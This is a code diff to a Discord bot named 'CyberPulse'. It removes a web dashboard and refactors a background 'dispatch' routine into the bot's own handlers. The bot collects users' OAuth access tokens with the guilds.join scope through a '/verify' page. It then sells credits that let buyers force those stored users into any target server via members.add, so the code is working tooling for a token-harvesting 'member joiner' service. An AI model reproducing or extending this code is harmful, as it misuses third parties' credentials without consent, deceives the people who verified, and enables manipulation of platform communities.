@@ -19,10 +19,8 @@ const {
 } = require('discord.js');
 const express = require('express');
 const http = require('http');
-const { Server } = require('socket.io');
 const mongoose = require('mongoose');
 const axios = require('axios');
-const session = require('express-session');
 require('dotenv').config();
 
 // ==================== CONFIGURATION & ENVIRONMENT ====================
@@ -31,7 +29,6 @@ const CLIENT_ID = process.env.CLIENT_ID;
 const CLIENT_SECRET = process.env.CLIENT_SECRET;
 const PUBLIC_URL = process.env.PUBLIC_URL || 'https://oauth1-bb1j.onrender.com';
 const REDIRECT_URI = process.env.REDIRECT_URI || `${PUBLIC_URL}/callback`;
-const WEB_REDIRECT_URI = process.env.WEB_REDIRECT_URI || `${PUBLIC_URL}/auth/callback`;
 const MONGO_URI = process.env.MONGO_URI;
 
 const OWNER_ID = '1370594462941581433';
@@ -118,19 +115,13 @@ function calculatePrice(quantity) {
   return { quantity, bonusPercent, tierName, bonusCredits, totalCreditsGiven };
 }
 
-// ==================== EXPRESS WEB SERVER & SOCKET.IO ====================
+// ==================== EXPRESS HEALTH SERVER ====================
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server);
 
 app.use(express.json());
-app.use(session({
-  secret: process.env.SESSION_SECRET || 'cyberpulse_secure_session_key',
-  resave: false,
-  saveUninitialized: false
-}));
 
-// Verification Screen Route
+// Verification Landing Screen & OAuth Route
 app.get('/verify', (req, res) => {
   const discordOAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join`;
   
@@ -245,161 +236,7 @@ app.get('/callback', async (req, res) => {
   }
 });
 
-// Web Dashboard Login & SSO
-app.get('/login', (req, res) => {
-  res.redirect(`https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(WEB_REDIRECT_URI)}&response_type=code&scope=identify`);
-});
-
-app.get('/auth/callback', async (req, res) => {
-  const code = req.query.code;
-  if (!code) return res.redirect('/');
-  try {
-    const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
-      client_id: CLIENT_ID, client_secret: CLIENT_SECRET, grant_type: 'authorization_code', code, redirect_uri: WEB_REDIRECT_URI
-    }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
-
-    const userResponse = await axios.get('https://discord.com/api/users/@me', {
-      headers: { Authorization: `Bearer ${tokenResponse.data.access_token}` }
-    });
-
-    req.session.user = { id: userResponse.data.id, username: userResponse.data.username };
-    res.redirect('/dashboard');
-  } catch (e) { res.status(500).send('❌ Dashboard login failed.'); }
-});
-
-app.get('/logout', (req, res) => { req.session.destroy(); res.redirect('/'); });
-
-app.get('/dashboard', async (req, res) => {
-  if (!req.session.user) return res.redirect('/login');
-  const uc = await UserCredit.findOne({ discordId: req.session.user.id }) || { balance: 0 };
-  const totalStock = await VerifiedUser.countDocuments();
-
-  res.send(`
-  <!DOCTYPE html>
-  <html lang="en">
-  <head>
-    <meta charset="UTF-8"/><title>CYBERPULSE // Operative Dashboard</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
-    <script src="/socket.io/socket.io.js"></script>
-    <style>
-      * { box-sizing: border-box; margin: 0; padding: 0; }
-      body { background: #06070d; color: #e2e8f0; font-family: 'Rajdhani', sans-serif; padding: 25px; }
-      .nav { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #7000ff; padding-bottom: 15px; margin-bottom: 30px; }
-      .nav h1 { font-family: 'Orbitron', sans-serif; color: #38bdf8; font-size: 1.4rem; }
-      .btn-logout { background: #ef4444; color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.85rem; }
-      .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }
-      .card { background: rgba(13, 14, 24, 0.9); border: 1px solid rgba(139, 92, 246, 0.3); border-radius: 12px; padding: 25px; }
-      .card h2 { font-family: 'Orbitron', sans-serif; font-size: 1rem; color: #a78bfa; margin-bottom: 15px; }
-      .stat-val { font-size: 2rem; font-weight: bold; color: #10b981; }
-      input, button { width: 100%; padding: 12px; margin-top: 10px; border-radius: 6px; border: 1px solid #8b5cf6; background: #0d0e18; color: white; font-family: inherit; }
-      button { background: linear-gradient(135deg, #7000ff, #38bdf8); font-family: 'Orbitron', sans-serif; cursor: pointer; font-weight: bold; }
-      .progress-container { width: 100%; background: #1e293b; border-radius: 8px; margin-top: 15px; overflow: hidden; height: 20px; }
-      .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #10b981, #38bdf8); transition: width 0.3s ease; }
-    </style>
-  </head>
-  <body>
-    <div class="nav">
-      <h1>⚡ CYBERPULSE DASHBOARD</h1>
-      <div><span>Operative: <b>${req.session.user.username}</b></span> &nbsp;&nbsp; <a href="/logout" class="btn-logout">LOGOUT</a></div>
-    </div>
-    <div class="grid">
-      <div class="card">
-        <h2>💳 YOUR BALANCE</h2>
-        <div class="stat-val">${uc.balance} CREDITS</div>
-        <p style="margin-top: 10px; color: #94a3b8;">Available Database Stock: <b>${totalStock}</b></p>
-      </div>
-      <div class="card">
-        <h2>🚀 QUEUE MEMBER DISPATCH</h2>
-        <form id="orderForm">
-          <label>Target Server ID:</label><input type="text" id="targetGuildId" required placeholder="Server ID"/>
-          <label style="margin-top: 10px; display:block;">Quantity:</label><input type="number" id="quantity" required min="1" placeholder="Amount"/>
-          <button type="submit">EXECUTE DISPATCH</button>
-        </form>
-      </div>
-      <div class="card" style="grid-column: 1 / -1;">
-        <h2>📊 LIVE DISPATCH TRACKER</h2>
-        <div id="activeOpStatus" style="color: #94a3b8;">No active dispatch running...</div>
-        <div class="progress-container"><div class="progress-bar" id="opProgressBar"></div></div>
-      </div>
-    </div>
-    <script>
-      const socket = io();
-      socket.emit('joinUserRoom', "${req.session.user.id}");
-      document.getElementById('orderForm').addEventListener('submit', async (e) => {
-        e.preventDefault();
-        const guildId = document.getElementById('targetGuildId').value;
-        const quantity = parseInt(document.getElementById('quantity').value, 10);
-        const res = await fetch('/api/web-order', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ guildId, quantity }) });
-        const data = await res.json();
-        if(!res.ok) alert(data.error);
-      });
-      socket.on('opProgress', (data) => {
-        document.getElementById('activeOpStatus').innerHTML = \`🚀 Dispatching Operation: <b>\${data.opId}</b> (\${data.current}/\${data.total})\`;
-        document.getElementById('opProgressBar').style.width = ((data.current / data.total) * 100) + '%';
-      });
-      socket.on('opComplete', (data) => {
-        document.getElementById('activeOpStatus').innerHTML = \`✅ Operation <b>\${data.opId}</b> Completed! Added \${data.successful} members.\`;
-        document.getElementById('opProgressBar').style.width = '100%';
-        setTimeout(() => location.reload(), 2000);
-      });
-    </script>
-  </body>
-  </html>`);
-});
-
-app.post('/api/web-order', async (req, res) => {
-  if (!req.session.user) return res.status(401).json({ error: 'Unauthorized' });
-  const { guildId, quantity } = req.body;
-  const userId = req.session.user.id;
-
-  let uc = await UserCredit.findOne({ discordId: userId });
-  if (!uc || uc.balance < quantity) return res.status(400).json({ error: 'Insufficient credit balance.' });
-
-  try {
-    const targetGuild = await client.guilds.fetch(guildId);
-    const botMember = await targetGuild.members.fetch(client.user.id);
-    if (!botMember.permissions.has(PermissionFlagsBits.ManageRoles)) {
-      return res.status(400).json({ error: 'CyberPulse lacks Manage Roles permission in target server.' });
-    }
-  } catch (e) { return res.status(400).json({ error: 'Bot is not in target server or Server ID is invalid.' }); }
-
-  uc.balance -= quantity;
-  uc.offlineConsumed += quantity;
-  await uc.save();
-
-  const opId = `WEB-OP-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
-  await Operation.create({ opId, discordId: userId, targetGuildId: guildId, requestedQuantity: quantity });
-
-  executeAsyncDispatch(opId, userId, guildId, quantity);
-  return res.json({ success: true, opId });
-});
-
-async function executeAsyncDispatch(opId, userId, guildId, quantity) {
-  try {
-    const targetGuild = await client.guilds.fetch(guildId);
-    const verifiedUsers = await VerifiedUser.find({});
-    let successful = 0;
-    for (const userRecord of verifiedUsers) {
-      if (successful >= quantity) break;
-      try {
-        const member = await targetGuild.members.fetch(userRecord.discordId).catch(() => null);
-        if (member) continue;
-        await targetGuild.members.add(userRecord.discordId, { accessToken: userRecord.accessToken });
-        successful++;
-        io.to(userId).emit('opProgress', { opId, current: successful, total: quantity });
-        await new Promise(r => setTimeout(r, 600));
-      } catch (err) {}
-    }
-    await Operation.findOneAndUpdate({ opId }, { successfulQuantity: successful, status: 'COMPLETED' });
-    io.to(userId).emit('opComplete', { opId, successful });
-  } catch (err) { await Operation.findOneAndUpdate({ opId }, { status: 'FAILED' }); }
-}
-
-io.on('connection', (socket) => {
-  socket.on('joinUserRoom', (userId) => socket.join(userId));
-});
-
-app.get('/', (req, res) => res.status(200).send('⚡ CYBERPULSE OAUTH & WEB DASHBOARD SYSTEM ONLINE'));
+app.get('/', (req, res) => res.status(200).send('⚡ CYBERPULSE DISCORD BOT SYSTEM ONLINE'));
 const PORT = process.env.PORT || 10000;
 server.listen(PORT, () => console.log(`🚀 [WEB SERVER] Running live on port ${PORT}`));
 
@@ -416,7 +253,7 @@ const slashCommands = [
 
 const rest = new REST({ version: '10' }).setToken(TOKEN);
 
-client.once('ready', async () => {
+client.once('clientReady', async () => {
   console.log(`🤖 [DISCORD BOT] Online and locked in as ${client.user.tag}!`);
   try { await rest.put(Routes.applicationCommands(CLIENT_ID), { body: slashCommands }); } catch (err) {}
 });
@@ -470,15 +307,14 @@ client.on('messageCreate', async (message) => {
 
     if (command === 'panel') {
       if (!hasPrivileges) return message.reply('❌ **Access Denied:** Only the bot owner or authorized partners can deploy the master panel.');
-      const embed = new EmbedBuilder().setColor(0x7000ff).setTitle('💎 CyberPulse Management & Web Hub 🚀')
-        .setDescription('🛒 **Buy Credits:** Open a private ticket with administration.\n💳 **My Credits:** Check your available balance.\n⚡ **Add Members:** Initialize deployment sequence.\n🌐 **Web Dashboard:** Manage orders via browser at ' + PUBLIC_URL + '/dashboard')
+      const embed = new EmbedBuilder().setColor(0x7000ff).setTitle('💎 CyberPulse Management & Hub 🚀')
+        .setDescription('🛒 **Buy Credits:** Open a private ticket with administration.\n💳 **My Credits:** Check your available balance.\n⚡ **Add Members:** Initialize deployment sequence.')
         .setImage(BANNER_IMAGE_URL);
       
       const row = new ActionRowBuilder().addComponents(
         new ButtonBuilder().setCustomId('btn_buy_credits_ticket').setLabel('Buy Credits').setStyle(ButtonStyle.Success).setEmoji('🛒'),
         new ButtonBuilder().setCustomId('btn_my_credits').setLabel('My Credits').setStyle(ButtonStyle.Secondary).setEmoji('💳'),
         new ButtonBuilder().setCustomId('btn_add_members').setLabel('Add Members').setStyle(ButtonStyle.Primary).setEmoji('⚡'),
-        new ButtonBuilder().setLabel('Web Dashboard').setStyle(ButtonStyle.Link).setURL(`${PUBLIC_URL}/dashboard`).setEmoji('🌐'),
         new ButtonBuilder().setLabel('Add Bot').setStyle(ButtonStyle.Link).setURL(`https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot`).setEmoji('🤖')
       );
       return message.reply({ embeds: [embed], components: [row] });
@@ -619,6 +455,33 @@ client.on('messageCreate', async (message) => {
   } catch (err) {}
 });
 
+// Background Dispatch Engine
+async function executeDiscordDispatch(opId, userId, guildId, quantity, messageRef) {
+  try {
+    const targetGuild = await client.guilds.fetch(guildId);
+    const verifiedUsers = await VerifiedUser.find({});
+    let successful = 0;
+    for (const userRecord of verifiedUsers) {
+      if (successful >= quantity) break;
+      try {
+        const member = await targetGuild.members.fetch(userRecord.discordId).catch(() => null);
+        if (member) continue;
+        await targetGuild.members.add(userRecord.discordId, { accessToken: userRecord.accessToken });
+        successful++;
+        if (successful % 5 === 0) {
+          await messageRef.edit(`Adding members ⏳\nProgress: ${successful}/${quantity}\n🆔 Operation: \`${opId}\``).catch(() => {});
+        }
+        await new Promise(r => setTimeout(r, 600));
+      } catch (err) {}
+    }
+    await Operation.findOneAndUpdate({ opId }, { successfulQuantity: successful, status: 'COMPLETED' });
+    await messageRef.edit(`✅ Operation \`${opId}\` Completed! Successfully added **${successful}** members.`);
+  } catch (err) {
+    await Operation.findOneAndUpdate({ opId }, { status: 'FAILED' });
+    await messageRef.edit(`❌ Operation \`${opId}\` failed due to an unexpected error.`);
+  }
+}
+
 // ==================== DISCORD INTERACTION HANDLING ====================
 client.on('interactionCreate', async (interaction) => {
   try {
@@ -672,7 +535,8 @@ client.on('interactionCreate', async (interaction) => {
         await Operation.create({ opId, discordId: interaction.user.id, targetGuildId: session.serverId, requestedQuantity: session.quantity });
 
         await interaction.update({ content: `Adding members ⏳\nProgress: 0/${session.quantity}\n🆔 Operation: \`${opId}\``, embeds: [], components: [] });
-        executeAsyncDispatch(opId, interaction.user.id, session.serverId, session.quantity);
+        const messageRef = await interaction.fetchReply();
+        executeDiscordDispatch(opId, interaction.user.id, session.serverId, session.quantity, messageRef);
       }
     }
 
